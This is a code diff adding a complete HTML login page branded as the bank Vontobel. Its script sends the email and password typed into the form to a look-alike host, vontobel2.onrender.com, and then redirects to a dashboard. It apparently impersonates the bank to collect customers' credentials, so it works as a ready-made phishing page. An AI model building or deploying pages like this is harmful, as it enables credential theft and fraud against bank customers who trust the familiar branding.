@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Vontobel – Secure Login</title>
+
+<!-- Font Awesome -->
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet"/>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:"Segoe UI", system-ui, Arial, sans-serif;
+}
+
+body{
+  min-height:100vh;
+  background:linear-gradient(135deg,#071b8d,#0b5cff);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+/* CONTAINER */
+.login-wrapper{
+  width:100%;
+  max-width:420px;
+  background:#ffffff;
+  border-radius:22px;
+  box-shadow:0 25px 60px rgba(0,0,0,.35);
+  padding:34px 30px;
+}
+
+/* LOGO */
+.logo{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  margin-bottom:28px;
+}
+
+.logo img{
+  height:44px;
+}
+
+.logo span{
+  font-size:22px;
+  font-weight:700;
+  color:#0b3cff;
+}
+
+/* HEADER */
+.login-title{
+  text-align:center;
+  margin-bottom:6px;
+  font-size:22px;
+  font-weight:700;
+}
+
+.login-sub{
+  text-align:center;
+  font-size:14px;
+  color:#6b7280;
+  margin-bottom:28px;
+}
+
+/* INPUT GROUP */
+.input-group{
+  margin-bottom:18px;
+  position:relative;
+}
+
+.input-group i{
+  position:absolute;
+  top:50%;
+  left:14px;
+  transform:translateY(-50%);
+  color:#6b7280;
+}
+
+.input-group input{
+  width:100%;
+  padding:14px 14px 14px 44px;
+  border-radius:12px;
+  border:1px solid #d1d5db;
+  font-size:15px;
+  outline:none;
+}
+
+.input-group input:focus{
+  border-color:#0b3cff;
+}
+
+/* PASSWORD TOGGLE */
+.toggle-pass{
+  position:absolute;
+  right:14px;
+  top:50%;
+  transform:translateY(-50%);
+  cursor:pointer;
+  color:#6b7280;
+}
+
+/* OPTIONS */
+.options{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  font-size:14px;
+  margin-bottom:22px;
+}
+
+.options label{
+  display:flex;
+  align-items:center;
+  gap:6px;
+  cursor:pointer;
+}
+
+.options a{
+  color:#0b3cff;
+  text-decoration:none;
+  font-weight:600;
+}
+
+/* BUTTON */
+.login-btn{
+  width:100%;
+  padding:14px;
+  background:linear-gradient(135deg,#071b8d,#0b5cff);
+  border:none;
+  color:#ffffff;
+  font-size:16px;
+  font-weight:600;
+  border-radius:14px;
+  cursor:pointer;
+  box-shadow:0 12px 25px rgba(11,60,255,.35);
+}
+
+.login-btn:hover{
+  opacity:.95;
+}
+
+/* FOOTER */
+.login-footer{
+  text-align:center;
+  margin-top:26px;
+  font-size:14px;
+  color:#6b7280;
+}
+
+.login-footer a{
+  color:#0b3cff;
+  font-weight:600;
+  text-decoration:none;
+}
+
+/* RESPONSIVE */
+@media(max-width:480px){
+  .login-wrapper{
+    border-radius:18px;
+    padding:28px 22px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="login-wrapper">
+
+  <!-- LOGO -->
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/V-logo.svg/2048px-V-logo.svg.png" alt="Vontobel">
+    <span>Vontobel</span>
+  </div>
+
+  <!-- TITLE -->
+  <div class="login-title">Secure Sign In</div>
+  <div class="login-sub">
+    Access your account securely and manage your transactions
+  </div>
+
+  <!-- FORM -->
+  <form>
+
+    <div class="input-group">
+      <i class="fas fa-envelope"></i>
+      <input type="email" placeholder="Email address" required>
+    </div>
+
+    <div class="input-group">
+      <i class="fas fa-lock"></i>
+      <input type="password" id="password" placeholder="Password" required>
+      <i class="fas fa-eye toggle-pass" onclick="togglePassword()"></i>
+    </div>
+
+    <div class="options">
+      <label>
+        <input type="checkbox"> Remember me
+      </label>
+      <a href="#">Forgot password?</a>
+    </div>
+
+    <button class="login-btn" type="submit">
+      Sign In
+    </button>
+
+  </form>
+
+  <!-- FOOTER -->
+  <div class="login-footer">
+    Don’t have an account? <a href="#">Create one</a>
+  </div>
+
+</div>
+
+<script>
+function togglePassword(){
+  const pass = document.getElementById("password");
+  pass.type = pass.type === "password" ? "text" : "password";
+}
+
+
+
+
+document.querySelector("form").addEventListener("submit", async function (e) {
+  e.preventDefault();
+
+  const email = document.querySelector('input[type="email"]').value;
+  const password = document.getElementById("password").value;
+
+  try {
+    const res = await fetch("https://vontobel2.onrender.com/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      credentials: "include", // 🔐 REQUIRED for session
+      body: JSON.stringify({ email, password })
+    });
+
+    const data = await res.json();
+
+    if (!res.ok) {
+      alert(data.message || "Login failed");
+      return;
+    }
+
+    // ✅ Redirect after login
+    window.location.href = "dashboard.html";
+
+  } catch (err) {
+    alert("Server error");
+  }
+});
+
+
+</script>
+
+</body>
+</html>
